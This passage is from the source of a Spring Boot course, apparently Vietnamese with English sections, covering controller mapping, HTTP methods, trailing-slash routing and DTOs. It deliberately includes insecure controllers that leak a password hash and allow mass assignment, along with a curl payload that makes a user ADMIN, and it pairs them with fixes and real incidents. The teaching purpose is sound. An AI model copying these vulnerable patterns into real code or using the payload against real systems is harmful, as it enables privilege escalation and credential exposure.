<div class="kv-grid">
  <div class="kv"><span class="k">@RestController</span><span class="v">Một <code>@Controller</code> (bean được quét thấy — bài 3.3) cộng <code>@ResponseBody</code> trên mọi hàm: giá trị trả về được ghi vào body của response (thành JSON nhờ Jackson — bài 4.3), không bị hiểu là tên một trang HTML.</span></div>
  <div class="kv"><span class="k">@RequestMapping("/labs")</span><span class="v">Tiền tố chung cho mọi hàm trong class.</span></div>
  <div class="kv"><span class="k">@GetMapping, @PostMapping, @PutMapping, @PatchMapping, @DeleteMapping</span><span class="v">Viết tắt của <code>@RequestMapping(method = …)</code>. Đường dẫn tính tiếp sau tiền tố của class.</span></div>
  <div class="kv"><span class="k">@PathVariable</span><span class="v">Một đoạn của đường dẫn: <code>/labs/{id}</code> ⇒ <code>long id</code>. Spring đổi chữ <code>"2"</code> thành <code>long</code>. Tên lấy từ tên tham số (cấu hình Maven/Gradle của Spring Boot biên dịch với <code>-parameters</code>, nên không cần ghi lại tên).</span></div>
  <div class="kv"><span class="k">@RequestParam</span><span class="v">Một giá trị trên query string: <code>?building=Alpha&amp;minCapacity=30</code>. Mặc định là bắt buộc; <code>required = false</code> cho <code>null</code>; <code>defaultValue</code> cho giá trị dự phòng (và làm nó thành tuỳ chọn).</span></div>
  <div class="kv"><span class="k">ResponseEntity&lt;T&gt;</span><span class="v">Body + mã trạng thái + header trong một đối tượng. Dùng khi trạng thái không phải lúc nào cũng 200: <code>notFound()</code>, <code>created(uri)</code>, <code>noContent()</code>.</span></div>
</div>
<p>Một chi tiết cần để ý ngay: controller là <strong>singleton</strong>, bị nhiều luồng Tomcat gọi cùng lúc (bài 3.4). Vì thế kho tạm trong RAM là <code>ConcurrentHashMap</code> với <code>AtomicLong</code> — <code>HashMap</code> thường và bộ đếm <code>long</code> sẽ mất cập nhật khi tải cao, y như thí nghiệm <code>count++</code> ở bài 2.4. Từ Chương 6 dữ liệu nằm trong PostgreSQL và controller không giữ trạng thái nào.</p>

<h3>Bảng ánh xạ Spring dựng lúc khởi động</h3>
<p>Nâng mức log của <code>RequestMappingHandlerMapping</code> lên TRACE, Spring in ra mọi route nó đã đăng ký:</p>
${OUT41_MAP}
<ul>
  <li>Mười một ánh xạ: bảy từ <code>LabController</code>, hai từ <code>PageController</code> (bên dưới), hai cho <code>/error</code> do Spring Boot tự thêm — endpoint viết các body lỗi JSON bạn sắp thấy.</li>
  <li>Thứ tự trong log không phải thứ tự so khớp. Khi nhiều mẫu cùng khớp một đường dẫn, Spring chọn mẫu <strong>cụ thể nhất</strong>: chữ cố định <code>/labs/count</code> thắng biến <code>/labs/{id}</code>, bạn viết hàm nào trước cũng vậy. Nhớ điều này khi so với Express.</li>
  <li>Khi bảng không như bạn nghĩ (controller nằm ở package ngoài vùng quét — bài 0.2, gõ sai đường dẫn), dòng log này là cách tìm ra nhanh nhất. Ở production, cùng bảng này có ở <code>/actuator/mappings</code> (Chương 15) — thứ không nên để công khai.</li>
</ul>

<h3>Đọc: GET</h3>
${OUT41_GET}
<p>Lab không tồn tại cho <code>404</code> với body rỗng, vì <code>ResponseEntity.notFound().build()</code> không có body. Chương 5 biến mọi lỗi thành body <code>application/problem+json</code> đúng chuẩn (RFC 9457); giờ thì mã trạng thái là thứ quan trọng. Để ý thêm: <code>/labs/count</code> được <code>count()</code> trả lời, không phải <code>one(long)</code> với một id vô lý.</p>

<h3>Ghi: POST, PUT, PATCH, DELETE</h3>
${OUT41_WRITE}
<div class="kv-grid">
  <div class="kv"><span class="k">POST /labs</span><span class="v">Tạo mới. <strong>201 Created</strong> + <code>Location: /labs/4</code> báo cho client tài nguyên mới nằm ở đâu. Không idempotent: gửi hai lần là tạo hai lab (bài 4.5 sửa điều này cho lượt đặt).</span></div>
  <div class="kv"><span class="k">PUT /labs/4</span><span class="v">Thay cả tài nguyên bằng thứ bạn gửi. Idempotent: gửi cùng một PUT mười lần, trạng thái cuối vẫn như một lần.</span></div>
  <div class="kv"><span class="k">PATCH /labs/4</span><span class="v">Chỉ đổi các trường được gửi. Ở đây <code>{"capacity":32}</code> giữ nguyên tên. Trong record của ta, <code>null</code> nghĩa là "không gửi" — tức là client không thể đặt một trường thành null bằng PATCH này (bài 5.4 bàn các lựa chọn).</span></div>
  <div class="kv"><span class="k">DELETE /labs/4</span><span class="v"><strong>204 No Content</strong>: xong, không có gì để trả. Lần DELETE thứ hai cho 404 — <em>trạng thái</em> vẫn như nhau (lab đã mất), nên DELETE vẫn idempotent dù mã trạng thái khác.</span></div>
</div>
<p>Phương thức <strong>an toàn</strong> (safe — GET, HEAD, OPTIONS) không được thay đổi gì; phương thức <strong>idempotent</strong> (các phương thức an toàn + PUT, DELETE) lặp lại không gây thêm tác dụng. Trình duyệt, proxy và thư viện HTTP dựa vào điều này: chúng tự thử lại request idempotent sau lỗi mạng, và không bao giờ tự thử lại POST. Một endpoint kiểu "GET /labs/4/delete" phá lời hứa đó — con bot xem trước liên kết hoặc trình duyệt tải trước sẽ xoá mất lab của bạn.</p>

<h3>Cố tình làm hỏng</h3>
${OUT41_LOI}
<ul>
  <li><strong><code>/labs/abc</code> ⇒ 400.</strong> Đường dẫn khớp <code>/labs/{id}</code>, nhưng <code>"abc"</code> không thành <code>long</code> được. Tương tự <code>minCapacity=ba-muoi</code>. Spring từ chối gọi hàm của bạn với dữ liệu rác — và ghi log đúng lý do (bên dưới).</li>
  <li><strong><code>DELETE /labs</code> ⇒ 405 + <code>Allow: GET, POST</code>.</strong> Đường dẫn có, phương thức thì không.</li>
  <li><strong><code>/labs/</code> và <code>/LABS</code> ⇒ 404.</strong> Từ Spring Framework 6, thừa dấu "/" cuối là một đường dẫn khác, và đường dẫn phân biệt hoa thường. (Spring Boot 2 khớp <code>/labs/</code> với <code>/labs</code>; nhiều ứng dụng bị 404 sau khi nâng cấp. Lý do nó bị bỏ nằm ở phần bảo mật bên dưới.)</li>
  <li><strong>HEAD và OPTIONS có sẵn.</strong> <code>HEAD</code> chạy hàm GET rồi bỏ body (để ý <code>Content-Length: 226</code>); <code>OPTIONS</code> liệt kê các phương thức được phép.</li>
</ul>
${OUT41_WARN}
<p>Mấy dòng WARN này là thứ đầu tiên phải đọc khi client nói "API của bạn trả 400 mà tôi không biết vì sao". Body response cố tình nói rất ít — mặc định Spring Boot không gửi thông báo exception cho client (bài 5.2 nói nên gửi gì thay vào đó).</p>

<h3>Lỗi kinh điển của người mới: @Controller thiếu @ResponseBody</h3>
${MA41_PAGE}
${OUT41_VIEW}
<p>Với <code>@Controller</code> trần, chuỗi <code>"hello"</code> là <em>tên một view</em> (một khuôn HTML). Dự án này không có template engine, nên Spring lùi về cách chuyển tiếp tới URL <code>hello</code> — chính là hàm đang chạy — rồi dừng với "Circular view path" và 500. Nếu có Thymeleaf trên classpath, bạn nhận lỗi khác ("template not found"). Cách sửa là <code>@ResponseBody</code>, hoặc dùng luôn <code>@RestController</code> cho API. Nếu bạn đã học Servlet/JSP ở PRJ301, đây chính là khác biệt giữa controller trả về trang và controller trả về dữ liệu.</p>

<h3>So với Express</h3>
<p>Cùng API đó viết bằng Express 5, các route khai theo thứ tự "tự nhiên":</p>
${MA41_EXPRESS}
${OUT41_EXPRESS}
<div class="kv-grid">
  <div class="kv"><span class="k">Thứ tự route</span><span class="v">Express thử các route <strong>theo thứ tự bạn đăng ký</strong>; <code>/labs/:id</code> đứng trước, nên <code>/labs/count</code> thành <code>id = "count"</code> ⇒ 404. Spring chọn theo độ cụ thể, thứ tự không quan trọng. Trong Express phải khai đường cố định trước đường có tham số.</span></div>
  <div class="kv"><span class="k">Kiểu dữ liệu</span><span class="v">Mọi thứ trong <code>req.params</code>/<code>req.query</code> là chuỗi. <code>Number("ba-muoi")</code> là <code>NaN</code>, mọi phép so sánh với <code>NaN</code> đều sai ⇒ một danh sách rỗng im lặng với 200. Spring đổi sang kiểu đã khai và trả 400. Trong Express bạn tự kiểm (zod — bài 6.3 khoá Node.js).</span></div>
  <div class="kv"><span class="k">Dấu "/" cuối</span><span class="v">Express (mặc định định tuyến không nghiêm) trả lời <code>/labs/</code> như <code>/labs</code>; Spring 6 trở đi thì không.</span></div>
  <div class="kv"><span class="k">Câu trả lời phỏng vấn</span><span class="v">"Express là một danh sách middleware thử theo thứ tự; Spring MVC là một bảng tra dựng từ annotation lúc khởi động, chọn mẫu khớp cụ thể nhất, tham số được đổi sẵn sang đúng kiểu."</span></div>
</div>

<h3>🕵️ Góc hacker — khi bảo vệ và bộ định tuyến đọc URL khác nhau</h3>
<p>Một luật bảo mật chỉ tốt khi nó đồng ý với bộ định tuyến. Nếu đoạn mã <em>bảo vệ</em> một đường dẫn so chuỗi theo một kiểu, còn đoạn mã <em>định tuyến</em> lại khớp theo kiểu khác, kẻ tấn công gửi một URL mà bảo vệ tưởng vô hại nhưng bộ định tuyến vẫn đưa tới hàm được bảo vệ. Đây là phiên bản nhỏ nhất trên Express — một lần kiểm viết tay cho đúng chuỗi <code>/admin/stats</code>:</p>
${MA41_BYPASS}
${OUT41_BYPASS}
<p>Bảo vệ so bằng <code>===</code>; bộ định tuyến không phân biệt hoa thường và bỏ qua dấu "/" cuối. Khác nhau hai ký tự, vượt qua hoàn toàn.</p>
<div class="callout warn"><p><strong>Chuyện thật trong Spring.</strong> <strong>CVE-2016-5007</strong> (spring.io, 7/7/2016, "Spring Security / MVC Path Matching Inconsistency"): Spring Security và Spring MVC so mẫu với độ nghiêm khác nhau — ví dụ cắt khoảng trắng trong các đoạn đường dẫn — nên một số đường dẫn mà Spring MVC đưa tới controller cần bảo vệ lại không bị Spring Security nhận ra là cần bảo vệ. Sửa ở Spring Security 4.1.1; thông báo còn khuyên để Spring MVC làm việc so khớp cho Security (<code>MvcRequestMatcher</code>) và thêm kiểm tra ở cấp hàm. Tháng <strong>6/2022</strong>, nhóm Spring mở issue <strong>#28552</strong>, "Deprecate trailing slash match and change default value from true to false", với đúng lập luận này: một luật cho <code>/resources</code>, một luật cho <code>/resources/**</code>, cộng với việc khớp cả dấu "/" cuối, cho phép người dùng thường vào được endpoint chỉ dành cho admin qua <code>/resources/</code>. Đó là lý do Spring Framework 6 trả 404 cho <code>/labs/</code> ở trên.</p>
<p><strong>Cách phòng:</strong> để chính framework định tuyến quyết định cái gì được bảo vệ (Spring Security dùng bộ so khớp của Spring MVC — Chương 9); mặc định từ chối, cho phép tường minh; bảo vệ cả hàm (<code>@PreAuthorize</code>), không chỉ URL; không bao giờ tự viết kiểm tra đường dẫn bằng so chuỗi; đưa các biến thể (<code>/x/</code>, <code>/X</code>, <code>/x;a=b</code>, <code>/x%2F</code>) vào test bảo mật (Chương 11).</p></div>

<h3>Đời thường và đi làm</h3>
<ul>
  <li><strong>Sau khi nâng lên Spring Boot 3 trở đi</strong> (minh hoạ một phiếu lỗi rất hay gặp): ứng dụng di động ghép URL kiểu <code>baseUrl + "/"</code> + đường dẫn và vài lời gọi kết thúc bằng <code>/</code>. Trên Boot 2 mọi thứ chạy; sau nâng cấp, các lời gọi đó nhận 404. Sửa phía client hoặc thêm ánh xạ tường minh — đừng bật lại khớp dấu "/" cuối toàn cục mà không nghĩ tới các luật bảo mật.</li>
  <li><strong>Đọc dự án của người khác</strong> (SWP391, chỗ làm mới): khởi động ứng dụng với dòng TRACE ở trên là có đủ danh sách endpoint trong năm giây — nhanh hơn mở từng controller.</li>
  <li><strong>Lập trình viên frontend</strong> sẽ đánh giá API của bạn qua mã trạng thái: 201 + Location sau khi tạo, 204 sau khi xoá, 404 / 405 / 400 đúng nghĩa của chúng. Phần còn lại của chương là để những câu trả lời đó chính xác.</li>
</ul>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"@Controller khác @RestController thế nào?"</strong> — <code>@RestController</code> = <code>@Controller</code> + <code>@ResponseBody</code>: giá trị trả về được tuần tự hoá vào body thay vì bị hiểu là tên view. Quên nó sẽ gặp "Circular view path" hoặc "template not found".</li>
  <li><strong>"@PathVariable khác @RequestParam?"</strong> — Một phần đường dẫn định danh tài nguyên (<code>/labs/2</code>) so với tuỳ chọn trên query string như lọc, sắp xếp, phân trang (<code>?building=Alpha</code>). Cả hai đều được đổi sang kiểu đã khai; đổi hỏng ⇒ 400.</li>
  <li><strong>"PUT khác PATCH? Phương thức nào idempotent?"</strong> — PUT thay cả tài nguyên, PATCH sửa một phần. Idempotent: GET, HEAD, OPTIONS, PUT, DELETE. POST thì không — vì thế thử lại POST cần khoá idempotency (bài 4.5).</li>
  <li><strong>"Hai ánh xạ cùng khớp một URL — cái nào thắng?"</strong> — Mẫu cụ thể nhất (đoạn cố định thắng biến, ít ký tự đại diện thắng nhiều), không phụ thuộc thứ tự khai báo. Express thì ngược lại, dùng thứ tự đăng ký.</li>
  <li><strong>"Vì sao /users/ trả 404 sau khi lên Spring Boot 3?"</strong> — Spring Framework 6 mặc định không khớp dấu "/" cuối nữa (issue #28552), vì độ vênh với luật bảo mật từng là nguồn của các lỗ vượt quyền.</li>
</ol>

<h3>🧪 Thực hành (20 phút)</h3>
<div class="callout ok"><ol>
  <li>Thêm <code>GET /labs/by-code/{code}</code> tìm lab theo mã, không phân biệt hoa thường (<code>ai-01</code> tìm ra <code>AI-01</code>), 404 khi không có.</li>
  <li>Làm cho <code>GET /labs/{id}</code> chỉ nhận chữ số, để <code>/labs/abc</code> cho <strong>404</strong> (không có tài nguyên đó) thay vì 400 — không viết <code>if</code>.</li>
</ol>
<p><strong>Đạt khi:</strong> <code>/labs/by-code/ai-01</code> ⇒ 200, <code>/labs/by-code/XYZ</code> ⇒ 404, <code>/labs/abc</code> ⇒ 404, <code>/labs/2</code> ⇒ 200.</p></div>
${giai('Xem một lời giải', `${MA41_GIAI}
${OUT41_GIAI}
<p><code>{id:\\d+}</code> là một biểu thức chính quy nằm trong mẫu đường dẫn: đường dẫn không khớp nó thì không khớp ánh xạ luôn, nên request dừng ở 404 trước khi có bất kỳ phép đổi kiểu nào.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Handler mapping (bảng ánh xạ)</span><span class="v">Bảng "phương thức + đường dẫn ⇒ hàm controller", dựng lúc khởi động từ annotation.</span></div>
  <div class="kv"><span class="k">@RestController</span><span class="v"><code>@Controller</code> + <code>@ResponseBody</code>: giá trị trả về thành body của response.</span></div>
  <div class="kv"><span class="k">@PathVariable / @RequestParam</span><span class="v">Giá trị lấy từ một đoạn đường dẫn / từ query string, đổi sang kiểu đã khai.</span></div>
  <div class="kv"><span class="k">ResponseEntity</span><span class="v">Mã trạng thái + header + body trả về cùng nhau.</span></div>
  <div class="kv"><span class="k">An toàn / idempotent</span><span class="v">Không đổi trạng thái / lặp lại không gây thêm tác dụng.</span></div>
  <div class="kv"><span class="k">405 + Allow</span><span class="v">Đường dẫn có nhưng không cho phương thức này; header liệt kê các phương thức dùng được.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Spring MVC biến annotation thành bảng ánh xạ lúc khởi động; mẫu cụ thể nhất thắng, tham số được đổi sang kiểu đã khai (không đổi được thì 400).</li>
  <li>Dùng phương thức đúng ý định và mã trạng thái đúng kết quả: 200, 201 + Location, 204, 400, 404, 405.</li>
  <li><code>@Controller</code> thiếu <code>@ResponseBody</code> sẽ đi tìm view — làm API thì dùng <code>@RestController</code>.</li>
  <li>Express khớp theo thứ tự đăng ký, giá trị là chuỗi, dễ dãi với dấu "/"; Spring khớp theo độ cụ thể, giá trị có kiểu, đường dẫn chính xác — và sự chính xác đó là một tính năng bảo mật.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-requestmapping.html', '🌱', 'Spring Framework — Mapping Requests', 'Mẫu URI, so sánh mẫu, consumes/produces, HEAD và OPTIONS.')}
${tl('https://github.com/spring-projects/spring-framework/issues/28552', '🐙', 'spring-framework #28552 — Deprecate trailing slash match', 'Cuộc thảo luận năm 2022 với ví dụ bảo mật đằng sau thay đổi của Spring 6.')}

<h3>Nguồn</h3>
<ul>
  <li>Output ở trên: MapApp và GiaiApp trên Spring Boot 4.1.2 / Spring Framework 7.0.10 / Tomcat 11.0.27, Temurin 21.0.12.1; Express 5.3.0 trên Node 22.22.2 (19/11/2026).</li>
  <li>Thông báo bảo mật CVE-2016-5007 của Spring (07/07/2016): <a href="https://spring.io/security/cve-2016-5007" target="_blank" rel="noopener">spring.io/security/cve-2016-5007</a></li>
  <li>Issue #28552 của Spring Framework (01/06/2022): <a href="https://github.com/spring-projects/spring-framework/issues/28552" target="_blank" rel="noopener">github.com/spring-projects/spring-framework/issues/28552</a></li>
  <li>RFC 9110 (HTTP Semantics), mục 9.2.1 phương thức an toàn và 9.2.2 phương thức idempotent.</li>
</ul>
</div>
`;

// ===== Bài 4.2 =====
const MA42_STUDENT = java("/** \"Entity\": giống hệt hình dạng bảng student trong DB (Chương 6 sẽ gắn @Entity). */\npublic class Student {\n    private long id;\n    private String email;\n    private String fullName;\n    private String passwordHash;\n    private String role = \"STUDENT\";\n    private int failedLogins;\n    private List<Booking> bookings = new ArrayList<>();\n}\n// (getter/setter lược bớt)");
const MA42_BOOKING = java("/** \"Entity\" lượt đặt — trỏ ngược về Student (quan hệ hai chiều, rất hay gặp với JPA). */\npublic class Booking {\n    private long id;\n    private String labCode;\n    private Student student;\n}\n// (getter/setter lược bớt)");
const MA42_BAD = java("/** CÁCH SAI: nhận và trả thẳng entity. */\n@RestController\n@RequestMapping(\"/bad\")\npublic class BadController {\n    private final Store store;\n\n    BadController(Store store) { this.store = store; }\n\n    @GetMapping(\"/me\")\n    public Student me() {\n        return store.an;                                  // trả cả object ⇒ trả cả bookings, mà booking lại trỏ về student…\n    }\n\n    @PutMapping(\"/me\")\n    public String update(@RequestBody Student body) {     // client gửi gì, Jackson gọi setter đó\n        store.an.setFullName(body.getFullName());\n        if (body.getRole() != null) store.an.setRole(body.getRole());                      // \"chép hết cho tiện\"\n        if (body.getPasswordHash() != null) store.an.setPasswordHash(body.getPasswordHash());\n        return \"role=\" + store.an.getRole() + \" passwordHash=\" + store.an.getPasswordHash();\n    }\n}");
const OUT42_REC = out("$ curl -s -o body.json -w \"HTTP %{http_code} · %{size_download} byte\\n\" localhost:8080/bad/me\nHTTP 200 · 8813 byte\n$ tail -c 60 body.json\n}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}}]}\n$ python3 check.py body.json\nvalid JSON · depth 166 student->bookings · keys at top: ['bookings'] · last level: {\"bookings\": []}\n# log của server:");
const OUT42_RECLOG = out("WARN … .w.s.m.s.DefaultHandlerExceptionResolver : Ignoring exception, response committed already: org.springframework.http.converter.HttpMessageNotWritableException: Could not write JSON: Document nesting depth (501) exceeds the maximum allowed (500, from `StreamWriteConstraints.getMaxNestingDepth()`)");
const MA42_IGNORE = java("import com.fasterxml.jackson.annotation.JsonIgnore;\n/** \"Entity\" lượt đặt — trỏ ngược về Student (quan hệ hai chiều, rất hay gặp với JPA). */\npublic class Booking {\n    private long id;\n    private String labCode;\n    private Student student;\n    @JsonIgnore                       // \"cách sửa\" hay gặp trên StackOverflow: cắt vòng lặp\n    public Student getStudent() { return student; }\n}\n// (getter/setter lược bớt)");
const OUT42_LEAK = out("# thêm @JsonIgnore lên Booking.getStudent() để cắt vòng — rồi gọi lại\n$ curl localhost:8080/bad/me\n{\"bookings\":[{\"id\":42,\"labCode\":\"AI-01\"}],\"email\":\"an@fpt.edu.vn\",\"failedLogins\":2,\"fullName\":\"Nguyễn Văn An\",\"id\":1,\"passwordHash\":\"$2a$10$ATyFwKzoo7da3jVdmzU1ZOCdd7RirbDozAZlAmkiXZbq9LdxSPUxi\",\"role\":\"STUDENT\"}");
const OUT42_MASS = out("$ curl -X PUT localhost:8080/bad/me -H 'Content-Type: application/json' -d '{\"fullName\":\"Nguyễn Văn An\",\"role\":\"ADMIN\",\"passwordHash\":\"$2a$10$attackerControlledHash\"}'\nrole=ADMIN passwordHash=$2a$10$attackerControlledHash");
const MA42_DTOS = java("/** DTO = hợp đồng của API. Chỉ chứa thứ client được thấy / được gửi. */\npublic final class Dtos {\n    private Dtos() {}\n\n    public record StudentResponse(long id, String email, String fullName, int bookingCount) {\n        static StudentResponse from(Student s) {                    // ánh xạ tay: rõ ràng, dễ debug\n            return new StudentResponse(s.getId(), s.getEmail(), s.getFullName(), s.getBookings().size());\n        }\n    }\n\n    public record UpdateProfileRequest(String fullName) {}         // không có role, không có passwordHash\n}");
const MA42_GOOD = java("/** CÁCH ĐÚNG: request DTO vào, response DTO ra. */\n@RestController\n@RequestMapping(\"/v2\")\npublic class GoodController {\n    private final Store store;\n    private final StudentMapper mapper;\n\n    GoodController(Store store, StudentMapper mapper) { this.store = store; this.mapper = mapper; }\n\n    @GetMapping(\"/me\")\n    public StudentResponse me() {\n        return StudentResponse.from(store.an);\n    }\n\n    @GetMapping(\"/me-mapstruct\")\n    public StudentResponse meMapstruct() {\n        return mapper.toResponse(store.an);\n    }\n\n    @PutMapping(\"/me\")\n    public StudentResponse update(@RequestBody UpdateProfileRequest req) {\n        store.an.setFullName(req.fullName());                       // chỉ trường được phép\n        return StudentResponse.from(store.an);\n    }\n}");
const OUT42_GOOD = out("$ curl localhost:8080/v2/me\n{\"id\":1,\"email\":\"an@fpt.edu.vn\",\"fullName\":\"Nguyễn Văn An\",\"bookingCount\":1}\n$ curl localhost:8080/v2/me-mapstruct\n{\"id\":1,\"email\":\"an@fpt.edu.vn\",\"fullName\":\"Nguyễn Văn An\",\"bookingCount\":0}\n$ curl -X PUT localhost:8080/v2/me -H 'Content-Type: application/json' -d '{\"fullName\":\"Nguyễn Văn An\",\"role\":\"ADMIN\"}'\n{\"id\":1,\"email\":\"an@fpt.edu.vn\",\"fullName\":\"Nguyễn Văn An\",\"bookingCount\":1}");
const OUT42_STRICT = out("# chạy với --spring.jackson.deserialization.fail-on-unknown-properties=true\n$ curl -i -X PUT localhost:8080/v2/me -H 'Content-Type: application/json' -d '{\"fullName\":\"Nguyễn Văn An\",\"role\":\"ADMIN\"}'\nHTTP/1.1 400 \nContent-Type: application/json\nTransfer-Encoding: chunked\nConnection: close\n\n{\"timestamp\":\"2026-11-18T17:42:22.176Z\",\"status\":400,\"error\":\"Bad Request\",\"path\":\"/v2/me\"}\n# log của server:\nWARN … JSON parse error: Unrecognized property \"role\" (class com.cuongthai.c4.dto.Dtos$UpdateProfileRequest), not marked as ignorable");
const MA42_MAPPER = java("import org.mapstruct.Mapper;\n\n/** MapStruct sinh lớp cài đặt lúc BIÊN DỊCH (không dùng reflection lúc chạy). */\n@Mapper(componentModel = \"spring\")\npublic interface StudentMapper {\n    Dtos.StudentResponse toResponse(Student s);\n}");
const OUT42_MSWARN = out("$ mvn compile\n[WARNING] /w/src/main/java/com/cuongthai/c4/dto/StudentMapper.java:[8,26] Unmapped target property: \"bookingCount\".\n[INFO] BUILD SUCCESS");
const MA42_IMPL = java("// target/generated-sources/annotations/com/cuongthai/c4/dto/StudentMapperImpl.java (MapStruct 1.6.3 sinh ra)\n@Component\npublic class StudentMapperImpl implements StudentMapper {\n\n    @Override\n    public Dtos.StudentResponse toResponse(Student s) {\n        if ( s == null ) {\n            return null;\n        }\n\n        long id = 0L;\n        String email = null;\n        String fullName = null;\n\n        id = s.getId();\n        email = s.getEmail();\n        fullName = s.getFullName();\n\n        int bookingCount = 0;\n\n        Dtos.StudentResponse studentResponse = new Dtos.StudentResponse( id, email, fullName, bookingCount );\n\n        return studentResponse;\n    }\n}");
const MA42_NODE = js("// mass.mjs — cùng hai lỗi của bài 4.2 trong Express: trả nguyên object, và Object.assign(user, req.body)\nimport express from 'express';\nconst app = express();\napp.use(express.json());\nconst an = { id: 1, email: 'an@fpt.edu.vn', fullName: 'Nguyễn Văn An', role: 'STUDENT',\n             passwordHash: '$2a$10$ATyFwKzoo7da3jVdmzU1ZOCdd7RirbDozAZlAmkiXZbq9LdxSPUxi' };\napp.get('/me', (req, res) => res.json(an));                       // lộ passwordHash\napp.put('/me', (req, res) => { Object.assign(an, req.body); res.json({ role: an.role }); });   // \"chép hết cho tiện\"\napp.put('/v2/me', (req, res) => {                                 // chỉ lấy trường được phép\n  const { fullName } = req.body;\n  an.fullName = fullName;\n  const { id, email } = an;\n  res.json({ id, email, fullName: an.fullName });\n});\napp.listen(41861);");
const OUT42_NODE = out("$ curl localhost:3000/me\n{\"id\":1,\"email\":\"an@fpt.edu.vn\",\"fullName\":\"Nguyễn Văn An\",\"role\":\"STUDENT\",\"passwordHash\":\"$2a$10$ATyFwKzoo7da3jVdmzU1ZOCdd7RirbDozAZlAmkiXZbq9LdxSPUxi\"}\n$ curl -X PUT localhost:3000/me -H 'Content-Type: application/json' -d '{\"role\":\"ADMIN\"}'\n{\"role\":\"ADMIN\"}\n$ curl -X PUT localhost:3000/v2/me -H 'Content-Type: application/json' -d '{\"fullName\":\"Nguyễn Văn An\",\"role\":\"STUDENT\"}'\n{\"id\":1,\"email\":\"an@fpt.edu.vn\",\"fullName\":\"Nguyễn Văn An\"}");
const MA42_FIXED = java("import org.mapstruct.Mapper;\nimport org.mapstruct.Mapping;\nimport org.mapstruct.ReportingPolicy;\n\n/** MapStruct sinh lớp cài đặt lúc BIÊN DỊCH (không dùng reflection lúc chạy). */\n@Mapper(componentModel = \"spring\", unmappedTargetPolicy = ReportingPolicy.ERROR)\npublic interface StudentMapper {\n    @Mapping(target = \"bookingCount\", expression = \"java(s.getBookings().size())\")\n    Dtos.StudentResponse toResponse(Student s);\n}");
const OUT42_MSERR = out("# unmappedTargetPolicy = ReportingPolicy.ERROR\n$ mvn compile\n[ERROR] …/StudentMapper.java:[9,26] Unmapped target property: \"bookingCount\".\n[INFO] BUILD FAILURE");
const OUT42_FIXED = out("$ curl localhost:8080/v2/me\n{\"id\":1,\"email\":\"an@fpt.edu.vn\",\"fullName\":\"Nguyễn Văn An\",\"bookingCount\":1}\n$ curl localhost:8080/v2/me-mapstruct\n{\"id\":1,\"email\":\"an@fpt.edu.vn\",\"fullName\":\"Nguyễn Văn An\",\"bookingCount\":1}");

const L42_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.2</span>
<h2>DTOs: why not expose entities directly</h2>
<p class="lead">The shortest controller returns the object you loaded from the database and accepts the same class as input. It compiles, it works on the first demo, and it carries four bugs that show up later: a response that loops until Jackson gives up, a password hash in the JSON, a student who makes himself admin with one extra field, and an API that changes every time someone renames a column. We reproduce all four on Spring Boot 4.1.2, then fix them with small <code>record</code> DTOs (Data Transfer Objects), mapped by hand and with MapStruct — including a MapStruct bug that only a compiler warning tells you about.</p>

<h3>In everyday life first</h3>
<p>A company keeps a personnel file on every employee: salary, ID number, home address, performance notes. What the employee wears at the door is a <strong>badge</strong>: name, photo, department. Nobody hands the personnel file to the security guard — and nobody lets the employee fill in the personnel file themselves. The <strong>entity</strong> is the file (shaped like the database row); a <strong>DTO</strong> is the badge (shaped like what this particular API call needs). A <em>response DTO</em> decides what goes out; a <em>request DTO</em> decides what a client is allowed to send in.</p>

<h3>The "entity"</h3>
<p>Chapter 6 adds <code>@Entity</code>; the shape is already realistic: a password hash, a role, a login-failure counter, and a two-way relation (a student has bookings, a booking points back to its student — extremely common with JPA).</p>
${MA42_STUDENT}
${MA42_BOOKING}
${MA42_BAD}

<h3>Bug 1 — a response that never ends</h3>
${OUT42_REC}
${OUT42_RECLOG}
<p>Student ⇒ bookings ⇒ booking ⇒ student ⇒ bookings… Jackson 3 stops at its default nesting limit of 500 levels — but it had already started writing, the status line <code>200</code> was already sent, and "response committed already" means Spring can no longer change it. The client receives 8&nbsp;813 bytes of <strong>valid JSON</strong>, 166 levels deep, where the innermost student has no email at all. No error on the client side. (Older Jackson 2 versions failed instead with the famous "Infinite recursion (StackOverflowError)".)</p>

<h3>Bug 2 — the StackOverflow fix leaks the hash</h3>
<p>The most up-voted answers for "Jackson infinite recursion" say: put <code>@JsonIgnore</code> (or <code>@JsonBackReference</code>) on the back-reference.</p>
${MA42_IGNORE}
${OUT42_LEAK}
<p>The loop is gone — and the response now contains <code>passwordHash</code>, <code>failedLogins</code> and <code>role</code>. A bcrypt hash is not the password, but it can be attacked offline at full GPU speed; the failure counter tells an attacker how close the account is to a lock-out. You could keep adding <code>@JsonIgnore</code> to every sensitive field, but that is a deny-list on a class that will keep growing: the next developer adds <code>nationalId</code> and forgets the annotation. Note also that Jackson 3 writes JavaBean properties <strong>in alphabetical order</strong> by default (<code>SORT_PROPERTIES_ALPHABETICALLY</code> is on, lesson 4.3).</p>

<h3>Bug 3 — mass assignment</h3>
${OUT42_MASS}
<p>The profile form only shows "full name", but the endpoint accepts a <code>Student</code>, so Jackson calls <strong>every setter the JSON names</strong>: <code>setRole("ADMIN")</code>, <code>setPasswordHash(…)</code>. The attacker now has admin rights, and a password hash they generated themselves — so they also know the password. This is <strong>mass assignment</strong>; OWASP API Security Top 10 (2023) groups it with excessive data exposure as <strong>API3: Broken Object Property Level Authorization</strong>.</p>
<div class="callout warn"><p><strong>🕵️ Real incident — GitHub, 4 March 2012.</strong> GitHub's public-key update form had a mass-assignment flaw — in the words of GitHub's own post, "a failure to properly check incoming form parameters". A user used it to add their own public key to the <code>rails</code> organisation and pushed a file to the Ruby on Rails repository to prove the point, at 8:49 am Pacific time. GitHub removed the key, suspended the user, shipped a fix at 9:53 am, audited the code base for other instances and published a post-mortem the same day. The framework (Rails) allowed it by default at the time; the fix was the same idea as a request DTO — an explicit list of fields a client may set.</p>
